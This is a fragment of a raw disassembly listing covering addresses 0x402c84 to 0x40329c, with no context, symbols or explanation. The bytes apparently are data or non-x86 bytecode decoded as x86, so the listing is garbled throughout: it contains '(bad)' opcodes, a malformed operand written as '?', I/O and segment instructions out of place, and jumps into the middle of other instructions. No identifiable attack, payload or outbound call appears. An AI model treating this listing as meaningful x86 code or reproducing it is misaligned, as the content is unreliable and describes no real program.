  402c84:	or     al,0x17
  402c86:	lea    edi,[eax]
  402c88:	add    BYTE PTR [eax],al
  402c8a:	add    DWORD PTR [ebx],edx
  402c8c:	cmp    dl,BYTE PTR [ecx]
  402c8e:	cmp    dl,BYTE PTR [esi]
  402c90:	pop    ds
  402c91:	and    BYTE PTR [ebp+0x6b6f3a11],bl
  402c97:	add    BYTE PTR [eax],al
  402c99:	or     dl,BYTE PTR [ebx]
  402c9b:	cmp    edx,DWORD PTR [esi]
  402c9d:	adc    edi,DWORD PTR [eax+edi*1]
  402ca0:	add    DWORD PTR es:[eax],eax
  402ca3:	add    BYTE PTR [ecx],dl
  402ca5:	cmp    edx,DWORD PTR [ecx]
  402ca7:	cmp    al,0x9a
  402ca9:	adc    ecx,DWORD PTR ds:0x3a6f0d11
  402caf:	add    BYTE PTR [eax],al
  402cb1:	or     ch,BYTE PTR [edi+0x2c]
  402cb4:	add    BYTE PTR [eax],al
  402cb6:	or     bh,BYTE PTR [ecx]
  402cb8:	or     BYTE PTR [ecx],al
  402cba:	add    BYTE PTR [eax],al
  402cbc:	adc    DWORD PTR ds:0x6c6f16,ecx
  402cc2:	add    BYTE PTR [edx],cl
  402cc4:	pop    ds
  402cc5:	sub    eax,0xd110e2e
  402cca:	sub    BYTE PTR [ebp+0x0],cl
  402ccd:	add    BYTE PTR [edx],cl
  402ccf:	outs   dx,DWORD PTR ds:[esi]
  402cd0:	dec    esi
  402cd1:	add    BYTE PTR [eax],al
  402cd3:	or     ch,BYTE PTR [ebx]
  402cd5:	push   ds
  402cd6:	pop    ds
  402cd7:	das    
  402cd8:	mov    WORD PTR [eax],?
  402cda:	add    BYTE PTR [eax],al
  402cdc:	add    DWORD PTR [ecx],edx
  402cde:	or     eax,0x4f6f17
  402ce3:	add    BYTE PTR [edx],cl
  402ce5:	sub    BYTE PTR [ebp+0x0],cl
  402ce8:	add    BYTE PTR [edx],cl
  402cea:	outs   dx,DWORD PTR ds:[esi]
  402ceb:	dec    esi
  402cec:	add    BYTE PTR [eax],al
  402cee:	or     ch,BYTE PTR [eax]
  402cf0:	ins    DWORD PTR es:[edi],dx
  402cf1:	add    BYTE PTR [eax],al
  402cf3:	or     dl,BYTE PTR [ebx]
  402cf5:	push   cs
  402cf6:	adc    DWORD PTR [esi],ecx
  402cf8:	jb     0x402c81
  402cfa:	add    DWORD PTR [eax],eax
  402cfc:	jo     0x402d26
  402cfe:	cmp    DWORD PTR [eax],eax
  402d00:	add    BYTE PTR [edx],cl
  402d02:	sub    al,0x12
  402d04:	adc    DWORD PTR [edx],ecx
  402d06:	sub    BYTE PTR [edx],ch
  402d08:	add    BYTE PTR [eax],al
  402d0a:	push   es
  402d0b:	outs   dx,DWORD PTR ds:[esi]
  402d0c:	imul   eax,DWORD PTR [eax],0x38260a00
  402d12:	scas   al,BYTE PTR es:[edi]
  402d13:	add    BYTE PTR [eax],al
  402d15:	add    BYTE PTR [ecx],dl
  402d17:	push   cs
  402d18:	jb     0x402ca5
  402d1a:	add    DWORD PTR [eax],eax
  402d1c:	jo     0x402d46
  402d1e:	cmp    DWORD PTR [eax],eax
  402d20:	add    BYTE PTR [edx],cl
  402d22:	sub    al,0xf
  402d24:	adc    DWORD PTR [ecx],ecx
  402d26:	adc    DWORD PTR [esi],ecx
  402d28:	outs   dx,DWORD PTR ds:[esi]
  402d29:	imul   eax,DWORD PTR [eax],0x38260a00
  402d2f:	xchg   ecx,eax
  402d30:	add    BYTE PTR [eax],al
  402d32:	add    BYTE PTR [ecx],dl
  402d34:	push   cs
  402d35:	outs   dx,DWORD PTR ds:[esi]
  402d36:	sub    al,0x0
  402d38:	add    BYTE PTR [edx],cl
  402d3a:	jb     0x402ccf
  402d3c:	add    DWORD PTR [eax],eax
  402d3e:	jo     0x402daf
  402d40:	sub    al,0x0
  402d42:	add    BYTE PTR [edx],cl
  402d44:	pop    ss
  402d45:	pop    eax
  402d46:	xor    DWORD PTR [ebp+0x11],edx
  402d49:	push   cs
  402d4a:	jb     0x402cef
  402d4c:	add    DWORD PTR [eax],eax
  402d4e:	jo     0x402d6b
  402d50:	outs   dx,DWORD PTR ds:[esi]
  402d51:	outs   dx,BYTE PTR ds:[esi]
  402d52:	add    BYTE PTR [eax],al
  402d54:	or     ch,BYTE PTR [esp+ebx*1]
  402d57:	adc    DWORD PTR [ecx],ecx
  402d59:	jb     0x402d18
  402d5b:	add    DWORD PTR [eax],eax
  402d5d:	jo     0x402d70
  402d5f:	push   cs
  402d60:	push   ds
  402d61:	outs   dx,DWORD PTR ds:[esi]
  402d62:	dec    edi
  402d63:	add    BYTE PTR [eax],al
  402d65:	or     ch,BYTE PTR [eax]
  402d67:	inc    edi
  402d68:	add    BYTE PTR [eax],al
  402d6a:	or     ch,BYTE PTR [edi+0x69]
  402d6d:	add    BYTE PTR [eax],al
  402d6f:	or     ah,BYTE PTR [esi]
  402d71:	sub    edx,DWORD PTR [ecx+0x11]
  402d74:	push   cs
  402d75:	jb     0x402d54
  402d77:	add    DWORD PTR [eax],eax
  402d79:	jo     0x402d96
  402d7b:	outs   dx,DWORD PTR ds:[esi]
  402d7c:	outs   dx,BYTE PTR ds:[esi]
  402d7d:	add    BYTE PTR [eax],al
  402d7f:	or     ch,BYTE PTR [ebx+ebx*1]
  402d82:	adc    DWORD PTR [ecx],ecx
  402d84:	jb     0x402d75
  402d86:	add    DWORD PTR [eax],eax
  402d88:	jo     0x402d9b
  402d8a:	push   cs
  402d8b:	pop    ds
  402d8c:	or     ch,BYTE PTR [edi+0x4f]
  402d8f:	add    BYTE PTR [eax],al
  402d91:	or     ch,BYTE PTR [eax]
  402d93:	inc    edi
  402d94:	add    BYTE PTR [eax],al
  402d96:	or     ch,BYTE PTR [edi+0x69]
  402d99:	add    BYTE PTR [eax],al
  402d9b:	or     ah,BYTE PTR [esi]
  402d9d:	adc    DWORD PTR [edx],ecx
  402d9f:	sub    BYTE PTR [edi],ch
  402da1:	add    BYTE PTR [eax],al
  402da3:	or     ch,BYTE PTR [eax]
  402da5:	cmp    al,0x0
  402da7:	add    BYTE PTR [esi],al
  402da9:	pop    ss
  402daa:	lea    eax,[ecx]
  402dac:	add    BYTE PTR [eax],al
  402dae:	add    DWORD PTR [ebx],edx
  402db0:	cmp    eax,0x11163d11
  402db5:	or     eax,0x283d11a2
  402dba:	xor    al,BYTE PTR [eax]
  402dbc:	add    BYTE PTR [edx],cl
  402dbe:	outs   dx,DWORD PTR ds:[esi]
  402dbf:	imul   eax,DWORD PTR [eax],0x11260a00
  402dc5:	cmp    al,0x17
  402dc7:	pop    eax
  402dc8:	adc    edi,DWORD PTR [ecx+edx*1]
  402dcb:	cmp    al,0x11
  402dcd:	cmp    ecx,DWORD PTR [esi-0x130c097]
  402dd3:	(bad)  
  402dd4:	call   DWORD PTR [ecx]
  402dd6:	or     DWORD PTR [edi+0x6f],ebp
  402dd9:	add    BYTE PTR [eax],al
  402ddb:	or     dl,BYTE PTR [ebx]
  402ddd:	cmp    BYTE PTR ds:[esi+0x11000003],dh
  402de4:	outs   dx,DWORD PTR ds:[esi]
  402de6:	jo     0x402de8
  402de8:	add    BYTE PTR [edx],cl
  402dea:	adc    ecx,DWORD PTR [edi]
  402dec:	adc    DWORD PTR [edi],ecx
  402dee:	outs   dx,DWORD PTR ds:[esi]
  402def:	jno    0x402df1
  402df1:	add    BYTE PTR [edx],cl
  402df3:	outs   dx,DWORD PTR ds:[esi]
  402df4:	cmp    al,BYTE PTR [eax]
  402df6:	add    BYTE PTR [edx],cl
  402df8:	adc    edx,DWORD PTR [eax]
  402dfa:	adc    DWORD PTR [eax],edx
  402dfc:	outs   dx,DWORD PTR ds:[esi]
  402dfd:	sub    al,0x0
  402dff:	add    BYTE PTR [edx],cl
  402e01:	sub    eax,0x280a1112
  402e06:	daa    
  402e07:	add    BYTE PTR [eax],al
  402e09:	push   es
  402e0a:	outs   dx,DWORD PTR ds:[esi]
  402e0b:	imul   eax,DWORD PTR [eax],0x38260a00
  402e11:	test   BYTE PTR [ebx],al
  402e13:	add    BYTE PTR [eax],al
  402e15:	adc    DWORD PTR [eax],edx
  402e17:	push   ss
  402e18:	outs   dx,DWORD PTR ds:[esi]
  402e19:	ins    BYTE PTR es:[edi],dx
  402e1a:	add    BYTE PTR [eax],al
  402e1c:	or     bl,BYTE PTR [edi]
  402e1e:	das    
  402e1f:	movups XMMWORD PTR cs:[eax],xmm2
  402e23:	push   ss
  402e24:	outs   dx,DWORD PTR ds:[esi]
  402e25:	ins    BYTE PTR es:[edi],dx
  402e26:	add    BYTE PTR [eax],al
  402e28:	or     bl,BYTE PTR [edi]
  402e2a:	sub    eax,0x35f40
  402e2f:	add    BYTE PTR [ecx],dl
  402e31:	adc    BYTE PTR [edi],dl
  402e33:	outs   dx,DWORD PTR ds:[esi]
  402e34:	dec    edi
  402e35:	add    BYTE PTR [eax],al
  402e37:	or     ch,BYTE PTR [edi+0x3a]
  402e3a:	add    BYTE PTR [eax],al
  402e3c:	or     ch,BYTE PTR [eax]
  402e3e:	dec    ebp
  402e3f:	add    BYTE PTR [eax],al
  402e41:	or     ch,BYTE PTR [edi+0x4e]
  402e44:	add    BYTE PTR [eax],al
  402e46:	or     dl,BYTE PTR [ebx]
  402e48:	adc    BYTE PTR [ecx],dl
  402e4a:	adc    BYTE PTR [edi+0x2c],ch
  402e4d:	add    BYTE PTR [eax],al
  402e4f:	or     ch,BYTE PTR ds:0x280a1112
  402e55:	sub    BYTE PTR [eax],al
  402e57:	add    BYTE PTR [esi],al
  402e59:	outs   dx,DWORD PTR ds:[esi]
  402e5a:	imul   eax,DWORD PTR [eax],0x38260a00
  402e60:	xor    eax,0x11000003
  402e65:	adc    BYTE PTR [edx+0x7],dh
  402e68:	add    al,BYTE PTR [eax]
  402e6a:	jo     0x402e94
  402e6c:	cmp    DWORD PTR [eax],eax
  402e6e:	add    BYTE PTR [edx],cl
  402e70:	sub    al,0x2e
  402e72:	adc    DWORD PTR [edi],eax
  402e74:	pop    ds
  402e75:	push   cs
  402e76:	cs or  al,0x11
  402e79:	pop    es
  402e7a:	pop    ds
  402e7b:	ucomiss xmm0,DWORD PTR [esi]
  402e7e:	adc    DWORD PTR [edi],eax
  402e80:	pop    ds
  402e81:	adc    BYTE PTR [ebx],dh
  402e83:	movups XMMWORD PTR [eax],xmm1
  402e86:	adc    DWORD PTR [eax],edx
  402e88:	outs   dx,DWORD PTR ds:[esi]
  402e89:	imul   eax,DWORD PTR [eax],0x38260a00
  402e8f:	push   es
  402e90:	add    eax,DWORD PTR [eax]
  402e92:	add    BYTE PTR [eax],ch
  402e94:	add    DWORD PTR [eax],eax
  402e96:	add    BYTE PTR [esi],al
  402e98:	push   ss
  402e99:	adc    esi,DWORD PTR [esi]
  402e9b:	fnsave [edx+0xe]
  402e9e:	add    BYTE PTR [eax],al
  402ea0:	adc    DWORD PTR [eax],edx
  402ea2:	jb     0x402eaf
  402ea4:	add    al,BYTE PTR [eax]
  402ea6:	jo     0x402ec3
  402ea8:	outs   dx,DWORD PTR ds:[esi]
  402ea9:	outs   dx,BYTE PTR ds:[esi]
  402eaa:	add    BYTE PTR [eax],al
  402eac:	or     bh,BYTE PTR [ecx]
  402eae:	mov    DWORD PTR [eax],eax
  402eb0:	add    BYTE PTR [eax],al
  402eb2:	adc    DWORD PTR [eax],edx
  402eb4:	jb     0x402ec1
  402eb6:	add    al,BYTE PTR [eax]
  402eb8:	jo     0x402f29
  402eba:	sub    al,0x0
  402ebc:	add    BYTE PTR [edx],cl
  402ebe:	outs   dx,DWORD PTR ds:[esi]
  402ebf:	dec    edi
  402ec0:	add    BYTE PTR [eax],al
  402ec2:	or     ch,BYTE PTR [edi+0x3a]
  402ec5:	add    BYTE PTR [eax],al
  402ec7:	or     ch,BYTE PTR [eax]
  402ec9:	dec    ebp
  402eca:	add    BYTE PTR [eax],al
  402ecc:	or     ch,BYTE PTR [edi+0x72]
  402ecf:	add    BYTE PTR [eax],al
  402ed1:	or     dl,BYTE PTR [ebx]
  402ed3:	adc    DWORD PTR [ecx],edx
  402ed5:	push   es
  402ed6:	sub    al,0x35
  402ed8:	adc    DWORD PTR [edx],ecx
  402eda:	sub    BYTE PTR [edi],ch
  402edc:	add    BYTE PTR [eax],al
  402ede:	or     ch,BYTE PTR [eax]
  402ee0:	push   ebp
  402ee1:	add    BYTE PTR [eax],al
  402ee3:	push   es
  402ee4:	sbb    BYTE PTR [ebp+0x1000001],cl
  402eea:	adc    edi,DWORD PTR ds:0x72163d11
  402ef0:	or     eax,DWORD PTR [edx]
  402ef2:	add    BYTE PTR [eax-0x5e],dh
  402ef5:	adc    DWORD PTR ds:0xa2111117,edi
  402efb:	adc    DWORD PTR ds:0x3228,edi
  402f01:	or     ch,BYTE PTR [edi+0x69]
  402f04:	add    BYTE PTR [eax],al
  402f06:	or     ah,BYTE PTR [esi]
  402f08:	cmp    BYTE PTR [edx+eax*1+0x11110000],cl
  402f0f:	outs   dx,DWORD PTR ds:[esi]
  402f10:	sub    al,0x0
  402f12:	add    BYTE PTR [edx],cl
  402f14:	sub    eax,0x280a1112
  402f19:	sub    DWORD PTR [eax],eax
  402f1b:	add    BYTE PTR [esi],al
  402f1d:	outs   dx,DWORD PTR ds:[esi]
  402f1e:	imul   eax,DWORD PTR [eax],0x38260a00
  402f24:	jno    0x402f28
  402f26:	add    BYTE PTR [eax],al
  402f28:	adc    DWORD PTR [ecx],edx
  402f2a:	sub    BYTE PTR [ebx+0x0],dh
  402f2d:	add    BYTE PTR [edx],cl
  402f2f:	sub    BYTE PTR [eax+eax*1+0x0],dh
  402f33:	or     dl,BYTE PTR [ebx]
  402f35:	push   es
  402f36:	cmp    BYTE PTR [esi+0x2],bl
  402f39:	add    BYTE PTR [eax],al
  402f3b:	adc    DWORD PTR [eax],edx
  402f3d:	jb     0x402f62
  402f3f:	add    al,BYTE PTR [eax]
  402f41:	jo     0x402f5e
  402f43:	outs   dx,DWORD PTR ds:[esi]
  402f44:	outs   dx,BYTE PTR ds:[esi]
  402f45:	add    BYTE PTR [eax],al
  402f47:	or     bh,BYTE PTR [ecx]
  402f49:	mov    DWORD PTR [eax],eax
  402f4b:	add    BYTE PTR [eax],al
  402f4d:	adc    DWORD PTR [eax],edx
  402f4f:	jb     0x402f74
  402f51:	add    al,BYTE PTR [eax]
  402f53:	jo     0x402fc4
  402f55:	sub    al,0x0
  402f57:	add    BYTE PTR [edx],cl
  402f59:	outs   dx,DWORD PTR ds:[esi]
  402f5a:	dec    edi
  402f5b:	add    BYTE PTR [eax],al
  402f5d:	or     ch,BYTE PTR [edi+0x3a]
  402f60:	add    BYTE PTR [eax],al
  402f62:	or     ch,BYTE PTR [eax]
  402f64:	dec    ebp
  402f65:	add    BYTE PTR [eax],al
  402f67:	or     ch,BYTE PTR [edi+0x72]
  402f6a:	add    BYTE PTR [eax],al
  402f6c:	or     dl,BYTE PTR [ebx]
  402f6e:	adc    dl,BYTE PTR [ecx]
  402f70:	push   es
  402f71:	sub    al,0x35
  402f73:	adc    DWORD PTR [edx],ecx
  402f75:	sub    BYTE PTR [edi],ch
  402f77:	add    BYTE PTR [eax],al
  402f79:	or     ch,BYTE PTR [eax]
  402f7b:	push   esi
  402f7c:	add    BYTE PTR [eax],al
  402f7e:	push   es
  402f7f:	sbb    BYTE PTR [ebp+0x1000001],cl
  402f85:	adc    edi,DWORD PTR ds:0x72163d11
  402f8b:	or     eax,DWORD PTR [edx]
  402f8d:	add    BYTE PTR [eax-0x5e],dh
  402f90:	adc    DWORD PTR ds:0xa2121117,edi
  402f96:	adc    DWORD PTR ds:0x3228,edi
  402f9c:	or     ch,BYTE PTR [edi+0x69]
  402f9f:	add    BYTE PTR [eax],al
  402fa1:	or     ah,BYTE PTR [esi]
  402fa3:	cmp    cl,dh
  402fa5:	add    DWORD PTR [eax],eax
  402fa7:	add    BYTE PTR [ecx],dl
  402fa9:	adc    ch,BYTE PTR [edi+0x2c]
  402fac:	add    BYTE PTR [eax],al
  402fae:	or     ch,BYTE PTR ds:0x280a1112
  402fb4:	sub    DWORD PTR [eax],eax
  402fb6:	add    BYTE PTR [esi],al
  402fb8:	outs   dx,DWORD PTR ds:[esi]
  402fb9:	imul   eax,DWORD PTR [eax],0x38260a00
  402fbf:	(bad)  
  402fc0:	add    DWORD PTR [eax],eax
  402fc2:	add    BYTE PTR [ecx],dl
  402fc4:	adc    ch,BYTE PTR [eax]
  402fc6:	jae    0x402fc8
  402fc8:	add    BYTE PTR [edx],cl
  402fca:	sub    BYTE PTR [eax+eax*1+0x0],dh
  402fce:	or     dl,BYTE PTR [ebx]
  402fd0:	push   es
  402fd1:	cmp    bl,al
  402fd3:	add    DWORD PTR [eax],eax
  402fd5:	add    BYTE PTR [ecx],dl
  402fd7:	adc    BYTE PTR [edx-0x6d],dh
  402fda:	add    DWORD PTR [eax],eax
  402fdc:	jo     0x402ff9
  402fde:	outs   dx,DWORD PTR ds:[esi]
  402fdf:	outs   dx,BYTE PTR ds:[esi]
  402fe0:	add    BYTE PTR [eax],al
  402fe2:	or     bh,BYTE PTR [ecx]
  402fe4:	mov    DWORD PTR [eax],eax
  402fe6:	add    BYTE PTR [eax],al
  402fe8:	adc    DWORD PTR [eax],edx
  402fea:	jb     0x402f7f
  402fec:	add    DWORD PTR [eax],eax
  402fee:	jo     0x40305f
  402ff0:	sub    al,0x0
  402ff2:	add    BYTE PTR [edx],cl
  402ff4:	outs   dx,DWORD PTR ds:[esi]
  402ff5:	dec    edi
  402ff6:	add    BYTE PTR [eax],al
  402ff8:	or     ch,BYTE PTR [edi+0x3a]
  402ffb:	add    BYTE PTR [eax],al
  402ffd:	or     ch,BYTE PTR [eax]
  402fff:	dec    ebp
  403000:	add    BYTE PTR [eax],al
  403002:	or     ch,BYTE PTR [edi+0x72]
  403005:	add    BYTE PTR [eax],al
  403007:	or     dl,BYTE PTR [ebx]
  403009:	adc    edx,DWORD PTR [ecx]
  40300b:	push   es
  40300c:	sub    al,0x35
  40300e:	adc    DWORD PTR [edx],ecx
  403010:	sub    BYTE PTR [edi],ch
  403012:	add    BYTE PTR [eax],al
  403014:	or     ch,BYTE PTR [eax]
  403016:	push   ebp
  403017:	add    BYTE PTR [eax],al
  403019:	push   es
  40301a:	sbb    BYTE PTR [ebp+0x1000001],cl
  403020:	adc    edi,DWORD PTR ds:0x72163d11
  403026:	xchg   ebx,eax
  403027:	add    DWORD PTR [eax],eax
  403029:	jo     0x402fcd
  40302b:	adc    DWORD PTR ds:0xa2131117,edi
  403031:	adc    DWORD PTR ds:0x3228,edi
  403037:	or     ch,BYTE PTR [edi+0x69]
  40303a:	add    BYTE PTR [eax],al
  40303c:	or     ah,BYTE PTR [esi]
  40303e:	cmp    BYTE PTR [esi+0x1],dl
  403041:	add    BYTE PTR [eax],al
  403043:	adc    DWORD PTR [ebx],edx
  403045:	outs   dx,DWORD PTR ds:[esi]
  403046:	sub    al,0x0
  403048:	add    BYTE PTR [edx],cl
  40304a:	sub    eax,0x280a1112
  40304f:	sub    DWORD PTR [eax],eax
  403051:	add    BYTE PTR [esi],al
  403053:	outs   dx,DWORD PTR ds:[esi]
  403054:	imul   eax,DWORD PTR [eax],0x38260a00
  40305a:	cmp    eax,DWORD PTR [ecx]
  40305c:	add    BYTE PTR [eax],al
  40305e:	adc    DWORD PTR [ebx],edx
  403060:	sub    BYTE PTR [ebp+0x0],dh
  403063:	add    BYTE PTR [edx],cl
  403065:	sub    BYTE PTR [esi+0x0],dh
  403068:	add    BYTE PTR [edx],cl
  40306a:	adc    eax,DWORD PTR [esi]
  40306c:	cmp    BYTE PTR [eax],ch
  40306e:	add    DWORD PTR [eax],eax
  403070:	add    BYTE PTR [ecx],dl
  403072:	adc    BYTE PTR [edx+0x41],dh
  403075:	add    al,BYTE PTR [eax]
  403077:	jo     0x403094
  403079:	outs   dx,DWORD PTR ds:[esi]
  40307a:	outs   dx,BYTE PTR ds:[esi]
  40307b:	add    BYTE PTR [eax],al
  40307d:	or     bh,BYTE PTR [ecx]
  40307f:	mov    DWORD PTR [eax],eax
  403081:	add    BYTE PTR [eax],al
  403083:	adc    DWORD PTR [eax],edx
  403085:	jb     0x4030c8
  403087:	add    al,BYTE PTR [eax]
  403089:	jo     0x4030fa
  40308b:	sub    al,0x0
  40308d:	add    BYTE PTR [edx],cl
  40308f:	outs   dx,DWORD PTR ds:[esi]
  403090:	dec    edi
  403091:	add    BYTE PTR [eax],al
  403093:	or     ch,BYTE PTR [edi+0x3a]
  403096:	add    BYTE PTR [eax],al
  403098:	or     ch,BYTE PTR [eax]
  40309a:	dec    ebp
  40309b:	add    BYTE PTR [eax],al
  40309d:	or     ch,BYTE PTR [edi+0x72]
  4030a0:	add    BYTE PTR [eax],al
  4030a2:	or     dl,BYTE PTR [ebx]
  4030a4:	adc    al,0x11
  4030a6:	push   es
  4030a7:	sub    al,0x35
  4030a9:	adc    DWORD PTR [edx],ecx
  4030ab:	sub    BYTE PTR [edi],ch
  4030ad:	add    BYTE PTR [eax],al
  4030af:	or     ch,BYTE PTR [eax]
  4030b1:	push   esi
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	push   es
  4030b5:	sbb    BYTE PTR [ebp+0x1000001],cl
  4030bb:	adc    edi,DWORD PTR ds:0x72163d11
  4030c1:	xchg   ebx,eax
  4030c2:	add    DWORD PTR [eax],eax
  4030c4:	jo     0x403068
  4030c6:	adc    DWORD PTR ds:0xa2141117,edi
  4030cc:	adc    DWORD PTR ds:0x3228,edi
  4030d2:	or     ch,BYTE PTR [edi+0x69]
  4030d5:	add    BYTE PTR [eax],al
  4030d7:	or     ah,BYTE PTR [esi]
  4030d9:	cmp    BYTE PTR [ebx+0x11000000],bh
  4030df:	adc    al,0x6f
  4030e1:	sub    al,0x0
  4030e3:	add    BYTE PTR [edx],cl
  4030e5:	sub    eax,0x280a1112
  4030ea:	sub    DWORD PTR [eax],eax
  4030ec:	add    BYTE PTR [esi],al
  4030ee:	outs   dx,DWORD PTR ds:[esi]
  4030ef:	imul   eax,DWORD PTR [eax],0x38260a00
  4030f5:	mov    al,ds:0x11000000
  4030fa:	adc    al,0x28
  4030fc:	jne    0x4030fe
  4030fe:	add    BYTE PTR [edx],cl
  403100:	sub    BYTE PTR [esi+0x0],dh
  403103:	add    BYTE PTR [edx],cl
  403105:	adc    eax,DWORD PTR [esi]
  403107:	cmp    BYTE PTR [ebp+0x16000000],cl
  40310d:	adc    edx,DWORD PTR ds:0x1011472b
  403113:	pop    es
  403114:	adc    DWORD PTR ds:0x39289a,edx
  40311a:	add    BYTE PTR [edx],cl
  40311c:	sub    al,0x34
  40311e:	adc    DWORD PTR [edi],eax
  403120:	adc    eax,0x15110633
  403125:	adc    eax,DWORD PTR [edi]
  403127:	sub    esi,DWORD PTR [esi]
  403129:	adc    DWORD PTR [edx],ecx
  40312b:	sub    BYTE PTR [edi],ch
  40312d:	add    BYTE PTR [eax],al
  40312f:	or     ch,BYTE PTR [eax]
  403131:	push   esp
  403132:	add    BYTE PTR [eax],al
  403134:	push   es
  403135:	pop    ss
  403136:	lea    eax,[ecx]
  403138:	add    BYTE PTR [eax],al
  40313a:	add    DWORD PTR [ebx],edx
  40313c:	cmp    eax,0x11163d11
  403141:	adc    BYTE PTR [edx+0x32283d11],ah
  403147:	add    BYTE PTR [eax],al
  403149:	or     ch,BYTE PTR [edi+0x69]
  40314c:	add    BYTE PTR [eax],al
  40314e:	or     ah,BYTE PTR [esi]
  403150:	sub    ecx,DWORD PTR ds:0x58171511
  403156:	adc    edx,DWORD PTR ds:0x8e071511
  40315c:	imul   esi,DWORD PTR [edx],0x71511b2
  403162:	mov    gs,WORD PTR [ecx+0x33]
  403165:	xor    edx,DWORD PTR [ecx]
  403167:	or     ch,BYTE PTR [eax]
  403169:	das    
  40316a:	add    BYTE PTR [eax],al
  40316c:	or     ch,BYTE PTR [eax]
  40316e:	cmp    DWORD PTR [eax],eax
  403170:	add    BYTE PTR [esi],al
  403172:	pop    ss
  403173:	lea    eax,[ecx]
  403175:	add    BYTE PTR [eax],al
  403177:	add    DWORD PTR [ebx],edx
  403179:	cmp    eax,0x11163d11
  40317e:	adc    BYTE PTR [edx+0x32283d11],ah
  403184:	add    BYTE PTR [eax],al
  403186:	or     ch,BYTE PTR [edi+0x69]
  403189:	add    BYTE PTR [eax],al
  40318b:	or     ah,BYTE PTR [esi]
  40318d:	sub    ecx,DWORD PTR [edx]
  40318f:	adc    DWORD PTR [eax],ecx
  403191:	adc    DWORD PTR [eax],edx
  403193:	outs   dx,DWORD PTR ds:[esi]
  403194:	imul   eax,DWORD PTR [eax],0x11260a00
  40319a:	outs   dx,DWORD PTR ds:[esi]
  40319c:	dec    eax
  40319d:	add    BYTE PTR [eax],al
  40319f:	or     bh,BYTE PTR [edx]
  4031a1:	ds cld 
  4031a3:	(bad)  
  4031a4:	(bad)  
  4031a5:	ficom  WORD PTR ds:0x3e753e11
  4031ab:	add    BYTE PTR [eax],al
  4031ad:	add    DWORD PTR [ebx],edx
  4031af:	aas    
  4031b0:	adc    DWORD PTR [edi],edi
  4031b2:	sub    al,0x7
  4031b4:	adc    DWORD PTR [edi],edi
  4031b6:	outs   dx,DWORD PTR ds:[esi]
  4031b7:	dec    ecx
  4031b8:	add    BYTE PTR [eax],al
  4031ba:	or     bl,ah
  4031bc:	adc    DWORD PTR [esi],eax
  4031be:	sub    eax,0x3a2817
  4031c3:	add    BYTE PTR [esi],al
  4031c5:	sub    BYTE PTR [eax],bl
  4031c7:	add    BYTE PTR [eax],al
  4031c9:	or     ch,BYTE PTR [eax]
  4031cb:	add    DWORD PTR [eax],eax
  4031cd:	add    BYTE PTR [esi],al
  4031cf:	push   ss
  4031d0:	adc    esi,DWORD PTR [esi]
  4031d2:	fnstsw WORD PTR [ebx]
  4031d4:	or     eax,DWORD PTR [eax]
  4031d6:	add    BYTE PTR [ecx],dl
  4031d8:	or     ch,BYTE PTR [edi+0x6f]
  4031db:	add    BYTE PTR [eax],al
  4031dd:	or     dl,BYTE PTR [ebx]
  4031df:	sub    edx,DWORD PTR ds:0x706f3e11
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	or     dl,BYTE PTR [ebx]
  4031ea:	push   ss
  4031eb:	adc    DWORD PTR [esi],edx
  4031ed:	outs   dx,DWORD PTR ds:[esi]
  4031ee:	jno    0x4031f0
  4031f0:	add    BYTE PTR [edx],cl
  4031f2:	sub    BYTE PTR [esi],al
  4031f4:	add    BYTE PTR [eax],al
  4031f6:	push   es
  4031f7:	adc    DWORD PTR [esi],edi
  4031f9:	outs   dx,DWORD PTR ds:[esi]
  4031fa:	dec    eax
  4031fb:	add    BYTE PTR [eax],al
  4031fd:	or     ch,BYTE PTR ds:0x1115dee2
  403203:	ds jne 0x403244
  403206:	add    BYTE PTR [eax],al
  403208:	add    DWORD PTR [ebx],edx
  40320a:	aas    
  40320b:	adc    DWORD PTR [edi],edi
  40320d:	sub    al,0x7
  40320f:	adc    DWORD PTR [edi],edi
  403211:	outs   dx,DWORD PTR ds:[esi]
  403212:	dec    ecx
  403213:	add    BYTE PTR [eax],al
  403215:	or     bl,ah
  403217:	adc    DWORD PTR [edi],eax
  403219:	adc    eax,0x44280b33
  40321e:	add    BYTE PTR [eax],al
  403220:	push   es
  403221:	jae    0x403278
  403223:	add    BYTE PTR [eax],al
  403225:	or     bh,BYTE PTR [edx+0x11]
  403228:	or     BYTE PTR [edi+0x77],ch
  40322b:	add    BYTE PTR [eax],al
  40322d:	or     cl,BYTE PTR [ecx]
  40322f:	adc    DWORD PTR [edi],eax
  403231:	xchg   esp,eax
  403232:	das    
  403233:	or     ebp,DWORD PTR [eax]
  403235:	xor    eax,0x73060000
  40323a:	push   ebp
  40323b:	add    BYTE PTR [eax],al
  40323d:	or     bh,BYTE PTR [edx+0x11]
  403240:	or     BYTE PTR [edi+0x77],ch
  403243:	add    BYTE PTR [eax],al
  403245:	or     cl,BYTE PTR [eax]
  403247:	adc    DWORD PTR [edi],eax
  403249:	xchg   esp,eax
  40324a:	xor    DWORD PTR [ebp+0x11],ecx
  40324d:	or     BYTE PTR [edi+0x77],ch
  403250:	add    BYTE PTR [eax],al
  403252:	or     cl,BYTE PTR [eax]
  403254:	adc    DWORD PTR [edi],eax
  403256:	xchg   esp,eax
  403257:	pop    ecx
  403258:	adc    edx,DWORD PTR [edi]
  40325a:	adc    DWORD PTR [edi],edx
  40325c:	pop    ss
  40325d:	xor    ecx,DWORD PTR [eax+ebp*1]
  403260:	push   edx
  403261:	add    BYTE PTR [eax],al
  403263:	push   es
  403264:	sub    BYTE PTR [esi],al
  403266:	add    BYTE PTR [eax],al
  403268:	push   es
  403269:	sub    ebp,DWORD PTR [esi]
  40326b:	sub    BYTE PTR [edi],ch
  40326d:	add    BYTE PTR [eax],al
  40326f:	or     ch,BYTE PTR [eax]
  403271:	push   ebx
  403272:	add    BYTE PTR [eax],al
  403274:	push   es
  403275:	pop    ss
  403276:	lea    eax,[ecx]
  403278:	add    BYTE PTR [eax],al
  40327a:	add    DWORD PTR [ebx],edx
  40327c:	cmp    eax,0x12163d11
  403281:	pop    ss
  403282:	sub    BYTE PTR [eax],dh
  403284:	add    BYTE PTR [eax],al
  403286:	or     ch,BYTE PTR [eax]
  403288:	xor    DWORD PTR [eax],eax
  40328a:	add    BYTE PTR [edx],cl
  40328c:	mov    ds:0x32283d11,al
  403291:	add    BYTE PTR [eax],al
  403293:	or     ch,BYTE PTR [eax]
  403295:	push   es
  403296:	add    BYTE PTR [eax],al
  403298:	push   es
  403299:	adc    DWORD PTR [eax],ecx
  40329b:	outs   dx,DWORD PTR ds:[esi]
  40329c:	ja     0x40329e
